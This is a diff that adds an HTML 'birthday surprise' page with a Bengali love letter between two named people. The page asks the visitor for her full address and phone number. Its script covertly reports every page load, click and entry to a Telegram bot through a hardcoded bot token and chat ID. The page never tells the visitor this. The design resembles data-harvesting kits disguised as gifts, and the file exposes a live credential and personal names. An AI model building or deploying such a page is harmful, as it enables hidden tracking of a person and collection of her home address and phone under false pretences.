@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>✨ Aciya · Eternal Surprise</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400;1,600&family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: #0b080a;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      background-image: radial-gradient(circle at 20% 30%, #2a1218 0%, #0b080a 80%);
+      transition: background 0.3s;
+    }
+
+    .app-wrapper {
+      max-width: 480px;
+      width: 100%;
+      margin: 0 auto;
+      position: relative;
+      background: rgba(20, 12, 16, 0.35);
+      backdrop-filter: blur(16px) saturate(180%);
+      -webkit-backdrop-filter: blur(16px) saturate(180%);
+      border-radius: 56px 56px 48px 48px;
+      padding: 28px 22px 36px;
+      box-shadow: 0 40px 80px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(230, 150, 120, 0.2);
+      border: 1px solid rgba(255, 180, 140, 0.15);
+      transition: all 0.3s ease;
+    }
+
+    .screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 20px;
+      animation: fadeRise 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+      width: 100%;
+    }
+
+    .screen.active {
+      display: flex;
+    }
+
+    @keyframes fadeRise {
+      0% { opacity: 0; transform: translateY(24px) scale(0.98); }
+      100% { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .love-title {
+      font-family: 'Playfair Display', serif;
+      font-weight: 600;
+      font-size: 2.1rem;
+      line-height: 1.25;
+      color: #fce1d6;
+      text-shadow: 0 0 30px rgba(230, 100, 80, 0.5);
+      letter-spacing: -0.01em;
+    }
+
+    .glass-card {
+      background: rgba(255, 220, 200, 0.05);
+      backdrop-filter: blur(8px);
+      -webkit-backdrop-filter: blur(8px);
+      border-radius: 44px;
+      padding: 32px 26px;
+      border: 1px solid rgba(255, 200, 170, 0.15);
+      box-shadow: 0 24px 48px rgba(0,0,0,0.6);
+      width: 100%;
+      transition: 0.3s;
+    }
+
+    .glass-card p {
+      color: #f0d7cb;
+      font-size: 1.1rem;
+      line-height: 1.7;
+      font-weight: 300;
+    }
+
+    .btn-primary {
+      background: linear-gradient(145deg, #d47a5e, #b1533a);
+      border: none;
+      padding: 18px 42px;
+      border-radius: 80px;
+      font-weight: 600;
+      font-size: 1.25rem;
+      color: #fff8f0;
+      box-shadow: 0 12px 35px rgba(200, 80, 50, 0.6), 0 0 0 1px rgba(255, 200, 150, 0.3);
+      transition: all 0.25s;
+      cursor: pointer;
+      letter-spacing: 0.5px;
+      backdrop-filter: blur(4px);
+      background: #b85a42;
+      border: 1px solid #f0ab8a;
+      width: fit-content;
+      min-width: 200px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+
+    .btn-primary:active {
+      transform: scale(0.95);
+      box-shadow: 0 5px 20px rgba(200, 80, 50, 0.7);
+    }
+
+    .btn-glow {
+      box-shadow: 0 0 40px #d96f4e, 0 12px 35px rgba(190, 70, 40, 0.8);
+    }
+
+    .btn-option {
+      background: rgba(60, 30, 28, 0.7);
+      backdrop-filter: blur(8px);
+      border: 1px solid #de9a80;
+      color: #fadfd2;
+      padding: 16px 32px;
+      border-radius: 60px;
+      font-weight: 500;
+      font-size: 1.15rem;
+      transition: 0.25s;
+      cursor: pointer;
+      min-width: 150px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.5);
+    }
+
+    .btn-option:active { transform: scale(0.94); background: #7a4236; }
+
+    .input-field, .input-area {
+      background: rgba(20, 12, 15, 0.7);
+      backdrop-filter: blur(4px);
+      border: 1px solid #b9826e;
+      border-radius: 60px;
+      padding: 18px 24px;
+      width: 100%;
+      color: #f5e3d9;
+      font-size: 1rem;
+      outline: none;
+      transition: 0.2s;
+      box-shadow: inset 0 4px 12px rgba(0,0,0,0.7);
+    }
+
+    .input-field:focus, .input-area:focus {
+      border-color: #e6a084;
+      box-shadow: 0 0 30px rgba(230, 120, 80, 0.4);
+    }
+
+    .input-area {
+      border-radius: 28px;
+      min-height: 130px;
+      resize: vertical;
+      font-family: 'Inter', sans-serif;
+    }
+
+    .typewriter-container {
+      text-align: left;
+      width: 100%;
+      max-height: 430px;
+      overflow-y: auto;
+      padding-right: 6px;
+      scrollbar-width: thin;
+      scrollbar-color: #b86b52 transparent;
+    }
+
+    .typewriter-container::-webkit-scrollbar { width: 4px; }
+    .typewriter-container::-webkit-scrollbar-thumb { background: #b86b52; border-radius: 20px; }
+
+    .typewriter-line {
+      color: #f7ddd0;
+      font-size: 1rem;
+      line-height: 1.8;
+      font-weight: 300;
+      margin-bottom: 6px;
+      opacity: 0;
+      animation: typeFade 0.35s forwards;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+
+    .typewriter-line.visible {
+      opacity: 1;
+    }
+
+    @keyframes typeFade {
+      0% { opacity: 0; transform: translateY(6px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    #heart-canvas, #confetti-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      pointer-events: none;
+      z-index: 9999;
+    }
+
+    #confetti-canvas { z-index: 9998; }
+
+    /* Music toggle - NOW PLAY ONLY, NO PAUSE */
+    .music-toggle {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 99999;
+      background: rgba(20, 10, 12, 0.7);
+      backdrop-filter: blur(10px);
+      border: 1px solid #b37a66;
+      color: #f3cdbc;
+      width: 54px;
+      height: 54px;
+      border-radius: 50%;
+      font-size: 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: default;
+      box-shadow: 0 0 30px rgba(200, 80, 50, 0.3);
+      pointer-events: none;
+      opacity: 0.7;
+    }
+
+    @media (max-width: 440px) {
+      .app-wrapper { padding: 18px 14px 28px; border-radius: 36px; }
+      .love-title { font-size: 1.7rem; }
+      .glass-card { padding: 22px 16px; }
+    }
+
+    .hidden { display: none !important; }
+    .flex-col { display: flex; flex-direction: column; gap: 16px; align-items: center; width: 100%; }
+  </style>
+</head>
+<body>
+  <!-- Music icon - display only, no interaction -->
+  <div class="music-toggle"><i class="fas fa-music"></i></div>
+
+  <audio id="bgSong" loop preload="auto">
+    <source src="https://files.catbox.moe/ig3q8m.mp3" type="audio/mpeg">
+  </audio>
+
+  <canvas id="heart-canvas"></canvas>
+  <canvas id="confetti-canvas"></canvas>
+
+  <div class="app-wrapper" id="appWrapper">
+    <!-- SCREEN 1 -->
+    <div id="screen1" class="screen active">
+      <div class="glass-card" style="padding: 44px 24px;">
+        <div style="font-size: 3.6rem; margin-bottom: 8px;">❤️</div>
+        <h1 class="love-title" style="font-size: 2rem;">Someone Special Has A Surprise For You</h1>
+        <p style="color: #eccfc1; margin: 10px 0 18px; font-size: 1.3rem; font-weight: 300;">Aciya Tuj Zara</p>
+        <button class="btn-primary btn-glow" id="openSurpriseBtn"><i class="fas fa-envelope-open-text"></i> Open Surprise</button>
+      </div>
+    </div>
+
+    <!-- SCREEN 2 -->
+    <div id="screen2" class="screen">
+      <div class="glass-card">
+        <h2 class="love-title" style="font-size: 2.4rem;">Ajke Koi Tarikh? ❤️</h2>
+        <button class="btn-primary" id="dateBtn" style="margin-top: 14px;">1 September 2026</button>
+      </div>
+    </div>
+
+    <!-- SCREEN 3 -->
+    <div id="screen3" class="screen">
+      <div class="glass-card">
+        <h2 class="love-title" style="font-size: 2.4rem;">Aj Ki Jano? 🥺</h2>
+        <button class="btn-primary" id="knowBtn" style="margin-top: 14px;">Na Janina ❤️</button>
+      </div>
+    </div>
+
+    <!-- SCREEN 4 -->
+    <div id="screen4" class="screen">
+      <div class="glass-card" style="padding: 22px 18px;">
+        <div class="typewriter-container" id="typewriterBox"></div>
+        <button class="btn-primary hidden" id="continueBtn" style="margin-top: 18px;">Continue ❤️</button>
+      </div>
+    </div>
+
+    <!-- SCREEN 5 -->
+    <div id="screen5" class="screen">
+      <div class="glass-card">
+        <h2 class="love-title" style="font-size: 1.9rem;">Jan, tumi e sob tomar gift. Ami ki pathabo? ❤️</h2>
+        <div style="display: flex; gap: 18px; flex-wrap: wrap; justify-content: center; margin: 12px 0;">
+          <button class="btn-option" id="chocolateBtn">🍫 Chocolate</button>
+          <button class="btn-option" id="dressBtn">👗 Dress</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- SCREEN 6 -->
+    <div id="screen6" class="screen">
+      <div class="glass-card flex-col">
+        <h2 class="love-title" id="detailTitle" style="font-size: 1.7rem;">Kemon chocolate anbo jan? 🍫</h2>
+        <input class="input-field" id="detailInput" placeholder="Tomar pochonder chocolate likho" />
+        <button class="btn-primary" id="detailNextBtn">Next ❤️</button>
+      </div>
+    </div>
+
+    <!-- SCREEN 7 -->
+    <div id="screen7" class="screen">
+      <div class="glass-card flex-col">
+        <h2 class="love-title" style="font-size: 1.7rem;">Jan, tomar full address lekho jekhane ami gift pathabo ❤️</h2>
+        <textarea class="input-area" id="addressInput" placeholder="Full address..."></textarea>
+        <button class="btn-primary" id="addressNextBtn">Continue ❤️</button>
+      </div>
+    </div>
+
+    <!-- SCREEN 8 -->
+    <div id="screen8" class="screen">
+      <div class="glass-card flex-col">
+        <h2 class="love-title" style="font-size: 1.7rem;">Tomar Contact Number ❤️</h2>
+        <input class="input-field" id="phoneInput" type="tel" placeholder="Phone Number" />
+        <button class="btn-primary" id="submitBtn">Submit ❤️</button>
+      </div>
+    </div>
+
+    <!-- FINAL SCREEN -->
+    <div id="finalScreen" class="screen">
+      <div class="glass-card" style="padding: 36px 22px; background: rgba(50, 20, 20, 0.3);">
+        <h1 class="love-title" style="font-size: 2.6rem;">❤️ Thank You My Love ❤️</h1>
+        <p style="font-size: 2rem; font-weight: 400; color: #fad9c8; margin: 8px 0;">Aciya Tuj Zara</p>
+        <p style="font-size: 1.3rem; font-weight: 300; color: #f0cfc0;">You Are My Everything</p>
+        <p style="font-size: 1.1rem; font-weight: 300; color: #e6bcab; margin: 14px 0;">I Am The Luckiest Person Because I Have You.</p>
+        <p style="font-size: 1.1rem; font-weight: 300; color: #e6bcab;">May Allah Keep You Happy Forever.</p>
+        <p style="margin-top: 20px; font-style: italic; color: #f5d6c4; font-size: 1.1rem;">Forever Yours, <br><span style="font-weight: 500;">Zara Rahman Orkon</span> ❤️</p>
+        <div style="margin-top: 12px; font-size: 2.8rem;">❤️👑❤️</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function(){
+      // ----- TELEGRAM CONFIG -----
+      const BOT_TOKEN = '8839279842:AAHIIyslYo9CqcZeRo7DCmQc9yb6R7QPfsI';
+      const CHAT_ID = '8562147442';
+
+      function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        }).catch(err => console.error('Telegram error:', err));
+      }
+
+      // ----- DOM refs -----
+      const screens = {
+        s1: document.getElementById('screen1'),
+        s2: document.getElementById('screen2'),
+        s3: document.getElementById('screen3'),
+        s4: document.getElementById('screen4'),
+        s5: document.getElementById('screen5'),
+        s6: document.getElementById('screen6'),
+        s7: document.getElementById('screen7'),
+        s8: document.getElementById('screen8'),
+        final: document.getElementById('finalScreen')
+      };
+
+      function showScreen(id) {
+        Object.values(screens).forEach(s => s.classList.remove('active'));
+        document.getElementById(id).classList.add('active');
+      }
+
+      // ----- AUTO-PLAY SONG - AGGRESSIVE APPROACH -----
+      const bgSong = document.getElementById('bgSong');
+      let isSongPlaying = false;
+
+      function forcePlaySong() {
+        if (isSongPlaying) return;
+        
+        // Try multiple methods to play
+        bgSong.play().then(() => {
+          isSongPlaying = true;
+          console.log('🎵 Music started playing');
+        }).catch((err) => {
+          console.log('Autoplay blocked, will try on user interaction');
+          // Try again on any user interaction
+          const playOnInteraction = () => {
+            bgSong.play().then(() => {
+              isSongPlaying = true;
+              console.log('🎵 Music started on user interaction');
+            }).catch(() => {});
+            document.removeEventListener('click', playOnInteraction);
+            document.removeEventListener('touchstart', playOnInteraction);
+          };
+          document.addEventListener('click', playOnInteraction);
+          document.addEventListener('touchstart', playOnInteraction);
+        });
+      }
+
+      // Try to play immediately
+      forcePlaySong();
+
+      // Also try when page loads fully
+      window.addEventListener('load', () => {
+        setTimeout(forcePlaySong, 100);
+      });
+
+      // Try again on any click/tap anywhere on page
+      document.addEventListener('click', forcePlaySong, { once: false });
+      document.addEventListener('touchstart', forcePlaySong, { once: false });
+
+      // ----- HEARTS & CONFETTI -----
+      const heartCanvas = document.getElementById('heart-canvas');
+      const hCtx = heartCanvas.getContext('2d');
+      const confettiCanvas = document.getElementById('confetti-canvas');
+      const cCtx = confettiCanvas.getContext('2d');
+      let hearts = [], confetti = [];
+      let heartRunning = false, confettiRunning = false;
+
+      function resizeCanvases() {
+        heartCanvas.width = window.innerWidth;
+        heartCanvas.height = window.innerHeight;
+        confettiCanvas.width = window.innerWidth;
+        confettiCanvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', resizeCanvases);
+      resizeCanvases();
+
+      function initHearts(count = 40) {
+        hearts = [];
+        for (let i = 0; i < count; i++) {
+          hearts.push({
+            x: Math.random() * heartCanvas.width,
+            y: Math.random() * heartCanvas.height - heartCanvas.height,
+            size: 10 + Math.random() * 26,
+            speed: 0.3 + Math.random() * 0.9,
+            opacity: 0.2 + Math.random() * 0.6,
+            angle: Math.random() * Math.PI * 2,
+            color: `hsl(${340 + Math.random() * 30}, 80%, ${60 + Math.random() * 30}%)`
+          });
+        }
+        heartRunning = true;
+        drawHearts();
+      }
+
+      function drawHearts() {
+        if (!heartRunning) return;
+        hCtx.clearRect(0, 0, heartCanvas.width, heartCanvas.height);
+        for (let h of hearts) {
+          h.y += h.speed * 0.45;
+          h.x += Math.sin(h.angle) * 0.4;
+          if (h.y > heartCanvas.height + 50) { h.y = -50; h.x = Math.random() * heartCanvas.width; }
+          hCtx.globalAlpha = h.opacity;
+          hCtx.fillStyle = h.color || '#e8685a';
+          hCtx.shadowColor = '#ff6b5a';
+          hCtx.shadowBlur = 30;
+          const s = h.size;
+          hCtx.beginPath();
+          hCtx.moveTo(h.x, h.y - s/2);
+          hCtx.bezierCurveTo(h.x - s/2, h.y - s, h.x - s, h.y + s/4, h.x, h.y + s/2);
+          hCtx.bezierCurveTo(h.x + s, h.y + s/4, h.x + s/2, h.y - s, h.x, h.y - s/2);
+          hCtx.fill();
+        }
+        hCtx.shadowBlur = 0;
+        hCtx.globalAlpha = 1;
+        requestAnimationFrame(drawHearts);
+      }
+
+      function initConfetti(count = 280) {
+        confetti = [];
+        const colors = ['#f7a58f', '#f7c8b0', '#e6856a', '#f0b8a0', '#ffd4b0', '#ffb09c', '#f5b8a8', '#ffccb8'];
+        for (let i = 0; i < count; i++) {
+          confetti.push({
+            x: Math.random() * confettiCanvas.width,
+            y: Math.random() * confettiCanvas.height - confettiCanvas.height,
+            w: 6 + Math.random() * 14,
+            h: 4 + Math.random() * 10,
+            color: colors[Math.floor(Math.random() * colors.length)],
+            speed: 2 + Math.random() * 5,
+            rotation: Math.random() * 360,
+            rotSpeed: (Math.random() - 0.5) * 6
+          });
+        }
+        confettiRunning = true;
+        drawConfetti();
+      }
+
+      function drawConfetti() {
+        if (!confettiRunning) return;
+        cCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+        for (let c of confetti) {
+          c.y += c.speed * 0.5;
+          c.rotation += c.rotSpeed;
+          if (c.y > confettiCanvas.height + 40) { c.y = -40; c.x = Math.random() * confettiCanvas.width; }
+          cCtx.save();
+          cCtx.translate(c.x, c.y);
+          cCtx.rotate(c.rotation * Math.PI / 180);
+          cCtx.fillStyle = c.color;
+          cCtx.shadowColor = '#d97a62';
+          cCtx.shadowBlur = 18;
+          cCtx.globalAlpha = 0.85;
+          cCtx.fillRect(-c.w/2, -c.h/2, c.w, c.h);
+          cCtx.restore();
+        }
+        cCtx.shadowBlur = 0;
+        cCtx.globalAlpha = 1;
+        requestAnimationFrame(drawConfetti);
+      }
+
+      // ----- TYPEWRITER -----
+      function renderTypewriter() {
+        const box = document.getElementById('typewriterBox');
+        const lines = [
+          "Happy Birthday, My Love ❤️",
+          "",
+          "Aciya Tuj Zara,",
+          "",
+          "আজ তোমার জন্মদিন। আমার জীবনের সবচেয়ে সুন্দর দিনগুলোর একটি, কারণ এই পৃথিবীতে আজকের দিনেই তুমি এসেছিলে।",
+          "",
+          "আমাদের পরিচয় অনলাইনে, আমাদের ভালোবাসার শুরুটাও অনলাইনে। কিন্তু তোমার প্রতি আমার অনুভূতি কখনোই ভার্চুয়াল নয়। তুমি আমার জীবনের সবচেয়ে মূল্যবান, সবচেয়ে প্রিয় এবং সবচেয়ে সৌভাগ্যের মানুষ। আল্লাহর কাছে আমি সবসময় শুকরিয়া আদায় করি তোমাকে আমার জীবনে পাঠানোর জন্য।",
+          "",
+          "তুমি আমার হাসির কারণ, আমার কষ্টের সঙ্গী, আমার শান্তি, আমার ভরসা। তোমার সাথে কথা বললে সব দুঃখ ভুলে যাই। তুমি আমার কাছে শুধু একজন মানুষ নও, তুমি আমার পৃথিবী।",
+          "",
+          "আমি জানি না ভবিষ্যতে কী লেখা আছে, কিন্তু আমি আন্তরিকভাবে দোয়া করি—ইন-শা-আল্লাহ একদিন তুমি আমার অর্ধাঙ্গিনী হবে। তোমাকে নিয়ে আমি অসংখ্য স্বপ্ন দেখি। একদিন তোমার হাত ধরে হাঁটবো, তোমার সাথে ঘুরবো, অনেক গল্প করবো, আর জীবনের প্রতিটি মুহূর্ত তোমার সাথে ভাগ করে নেবো।",
+          "",
+          "তুমি আমার কলিজার টুকরা। তোমার হাসি আমার কাছে পৃথিবীর সবচেয়ে সুন্দর জিনিস। আমি চাই তুমি সবসময় সুখে থাকো, ভালো থাকো, আর তোমার জীবনের প্রতিটি স্বপ্ন পূরণ হোক।",
+          "",
+          "আজ তোমার বিশেষ দিনে আমি শুধু একটা কথাই বলতে চাই—",
+          "",
+          "I Love You More Than Words Can Ever Explain. ❤️",
+          "",
+          "Happy Birthday, My Future Queen. 👑",
+          "",
+          "Forever Yours,",
+          "Zara Rahman Orkon ❤️"
+        ];
+
+        box.innerHTML = '';
+        let idx = 0;
+        const continueBtn = document.getElementById('continueBtn');
+        continueBtn.classList.add('hidden');
+
+        function showNextLine() {
+          if (idx < lines.length) {
+            const div = document.createElement('div');
+            div.className = 'typewriter-line visible';
+            div.textContent = lines[idx] || '\u00A0';
+            box.appendChild(div);
+            box.scrollTop = box.scrollHeight;
+            idx++;
+            const delay = lines[idx-1]?.length > 40 ? 45 : 30;
+            setTimeout(showNextLine, delay);
+          } else {
+            continueBtn.classList.remove('hidden');
+          }
+        }
+        showNextLine();
+      }
+
+      // ----- LOCAL STORAGE -----
+      function saveData(key, value) {
+        try { localStorage.setItem('aciya_' + key, value); } catch(e) {}
+      }
+
+      // ----- NAVIGATION & EVENTS -----
+      document.getElementById('openSurpriseBtn').addEventListener('click', () => {
+        showScreen('screen2');
+        sendToTelegram('🎉 <b>Someone opened the surprise!</b>');
+        // Try to play music again
+        forcePlaySong();
+      });
+
+      document.getElementById('dateBtn').addEventListener('click', () => {
+        showScreen('screen3');
+        sendToTelegram('📅 <b>Date confirmed:</b> 1 September 2026');
+        forcePlaySong();
+      });
+
+      document.getElementById('knowBtn').addEventListener('click', () => {
+        showScreen('screen4');
+        renderTypewriter();
+        initHearts(40);
+        sendToTelegram('💌 <b>She read the love letter!</b>');
+        forcePlaySong();
+      });
+
+      document.getElementById('continueBtn').addEventListener('click', () => {
+        showScreen('screen5');
+        forcePlaySong();
+      });
+
+      let giftType = '';
+      document.getElementById('chocolateBtn').addEventListener('click', () => {
+        giftType = 'chocolate';
+        document.getElementById('detailTitle').innerHTML = 'Kemon chocolate anbo jan? 🍫';
+        document.getElementById('detailInput').placeholder = 'Tomar pochonder chocolate likho';
+        showScreen('screen6');
+        sendToTelegram('🍫 <b>Gift choice:</b> Chocolate');
+        forcePlaySong();
+      });
+
+      document.getElementById('dressBtn').addEventListener('click', () => {
+        giftType = 'dress';
+        document.getElementById('detailTitle').innerHTML = 'Tomar ki dress lagbe jan? 👗';
+        document.getElementById('detailInput').placeholder = 'Dress er color, size, design likho';
+        showScreen('screen6');
+        sendToTelegram('👗 <b>Gift choice:</b> Dress');
+        forcePlaySong();
+      });
+
+      document.getElementById('detailNextBtn').addEventListener('click', () => {
+        const val = document.getElementById('detailInput').value.trim();
+        if (val) {
+          saveData('giftDetail_' + giftType, val);
+          sendToTelegram(`📝 <b>${giftType === 'chocolate' ? 'Chocolate' : 'Dress'} detail:</b>\n${val}`);
+        }
+        showScreen('screen7');
+        forcePlaySong();
+      });
+
+      document.getElementById('addressNextBtn').addEventListener('click', () => {
+        const addr = document.getElementById('addressInput').value.trim();
+        if (addr) {
+          saveData('address', addr);
+          sendToTelegram(`📍 <b>Address:</b>\n${addr}`);
+        }
+        showScreen('screen8');
+        forcePlaySong();
+      });
+
+      document.getElementById('submitBtn').addEventListener('click', () => {
+        const phone = document.getElementById('phoneInput').value.trim();
+        if (phone) {
+          saveData('phone', phone);
+          sendToTelegram(`📱 <b>Phone:</b>\n${phone}`);
+        }
+        showScreen('finalScreen');
+        initConfetti(300);
+        setTimeout(() => initHearts(50), 400);
+        saveData('final', 'submitted');
+        sendToTelegram('❤️‍🔥 <b>She completed the surprise!</b> Everything submitted. Thank you, Aciya!');
+        forcePlaySong();
+      });
+
+      window.addEventListener('load', () => {
+        initHearts(18);
+        sendToTelegram('🌹 <b>Birthday surprise website loaded!</b>');
+        // Try to start music
+        setTimeout(forcePlaySong, 200);
+      });
+    })();
+  </script>
+</body>
+  </html>
